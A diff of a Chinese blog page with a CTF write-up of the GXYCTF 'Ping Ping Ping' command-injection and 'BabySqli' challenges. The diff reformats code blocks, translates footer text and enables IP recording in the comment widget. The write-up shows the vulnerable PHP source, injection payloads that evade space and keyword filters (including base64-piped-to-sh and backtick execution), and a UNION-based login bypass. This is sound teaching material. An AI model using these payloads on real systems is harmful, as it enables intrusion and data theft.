@@ -465,26 +465,46 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <a id="more"></a>
 
 <h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>开始进入提示传参ip,原题应该是直接给了一个输入框，输入后发现有执行ping命令的效果<br>那么看来是命令执行的题目了，命令执行的方法大抵是加上管道符或者分号，那么试试管道符<br><img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ls"><br>尝试读flag发现果然被ban了，那么试试index.php发现提示空格被ban了。<br>绕过空格的方法大概有以下几种：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
-<p>不妨就用 <code>$IFS</code>试试，无果，用<code>${IFS}</code>发现{}被ban。再试<code>$IFS$1</code>成功。<br>源码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match);</span></span><br><span class="line"><span class="string">    die("fxck your symbol!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/ /", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your space!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/bash/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your bash!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/.*f.*l.*a.*g.*/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your flag!");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec("ping -c 4 ".$ip);</span></span><br><span class="line"><span class="string">  echo "</span></span><br><span class="line"><span class="string">";</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code>$IFS
+${IFS}
+$IFS$1 //$1改成$加其他数字貌似都行
+&lt; 
+&lt;&gt; 
+{cat,flag.php}  //用逗号实现了空格功能
+%20 
+%09 </code></pre><p>不妨就用 <code>$IFS</code>试试，无果，用<code>${IFS}</code>发现{}被ban。再试<code>$IFS$1</code>成功。<br>源码如下：</p>
+<pre><code class="php">/?ip=
+|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
+    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
+    die(&quot;fxck your symbol!&quot;);
+  } else if(preg_match(&quot;/ /&quot;, $ip)){
+    die(&quot;fxck your space!&quot;);
+  } else if(preg_match(&quot;/bash/&quot;, $ip)){
+    die(&quot;fxck your bash!&quot;);
+  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
+    die(&quot;fxck your flag!&quot;);
+  }
+  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
+  echo &quot;
+&quot;;
+  print_r($a);
+}
+
+?&gt;</code></pre>
 <p>过滤了许多标点，空格，bash,包括flag的贪婪匹配。那么自己印象中几种做法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.cat fl*       利用*匹配任意 不行</span><br><span class="line">2.echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash   也不行</span><br><span class="line">3.ca\t fl\ag.php   不行</span><br><span class="line">4.cat fl&#39;&#39;ag.php 不行</span><br></pre></td></tr></table></figure>
-<p>那么如何解决呢？其实还有一种比较常见的做法没有提及，那就是变量拼接：<br><img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="变量拼接"><br>之前自己特别喜欢用的一句话木马拆开用也是这个道理。</p>
+<pre><code>1.cat fl*       利用*匹配任意 不行
+2.echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash   也不行
+3.ca\t fl\ag.php   不行
+4.cat fl&#39;&#39;ag.php 不行</code></pre><p>那么如何解决呢？其实还有一种比较常见的做法没有提及，那就是变量拼接：<br><img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="变量拼接"><br>之前自己特别喜欢用的一句话木马拆开用也是这个道理。</p>
 <p>正好，我们看到源码中有一个$a变量可以覆盖，那么payload就出来了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
-<p>然后有官方与其他大佬的高端解法：<br>官方：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
-<p>过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行。</p>
+<pre><code>/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre><p>然后有官方与其他大佬的高端解法：<br>官方：</p>
+<pre><code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre><p>过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行。</p>
 <p>dalao<br>内联执行的做法，只能说V&amp;N的师傅们太强了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;530bbcaf-9d64-494e-8993-bb3727c31a5a.node3.buuoj.cn&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure>
-<p>内联，就是将反引号内命令的输出作为输入执行。<br>秒题大概就是这种做法吧……</p>
+<pre><code>http://530bbcaf-9d64-494e-8993-bb3727c31a5a.node3.buuoj.cn/?ip=127.0.0.1;cat$IFS$9`ls`</code></pre><p>内联，就是将反引号内命令的输出作为输入执行。<br>秒题大概就是这种做法吧……</p>
 <h1 id="BabySqli"><a href="#BabySqli" class="headerlink" title="BabySqli"></a>BabySqli</h1><p>进去后一个账号，密码输入框。先随便输下，提示wrong pass。但是看源码有意外收获<img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="FUZZ"><br>从形式上看数字成分都没有超过6,可能是base32，解码后得到一个base64编码，解码后得到以下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure>
-<p>那么就可以在username这个注入点下手处理了。这道题目只过滤了基本的and与等号还是很能操作的。不过后来看别人说这题考点在MD5查询绕过。这么说的原因是，就算成功注入把admin密码的MD5拿到，因为解不了的缘故等于没用。基于题目提示的wrong pass，那么大概率是直接拿输入密码的MD5数值跟数据库里已知值比较。</p>
+<pre><code>select * from user where username = &#39;$name&#39;</code></pre><p>那么就可以在username这个注入点下手处理了。这道题目只过滤了基本的and与等号还是很能操作的。不过后来看别人说这题考点在MD5查询绕过。这么说的原因是，就算成功注入把admin密码的MD5拿到，因为解不了的缘故等于没用。基于题目提示的wrong pass，那么大概率是直接拿输入密码的MD5数值跟数据库里已知值比较。</p>
 <p>稍微FUZZ一下<code>admin&#39; union select 1,2,3</code>可以确认有三个字段<br>后面确认大概是id,admin，passwd三个字段。这里为了绕过，需要保证我们的查询结构一致，就可直接select 想要的返回值。<br>那么构造一个为假的查询-1，后面接上联合查询：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select 1,&#39;admin&#39;,&#39;7363a0d0604902af7b70b271a0b96480&#39;#</span><br></pre></td></tr></table></figure>
-<p>密码输123即可</p>
+<pre><code>-1&#39; union select 1,&#39;admin&#39;,&#39;7363a0d0604902af7b70b271a0b96480&#39;#</code></pre><p>密码输123即可</p>
 
   
   
@@ -692,7 +712,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -704,9 +724,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -839,6 +859,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1052,7 +1074,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1108,6 +1130,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
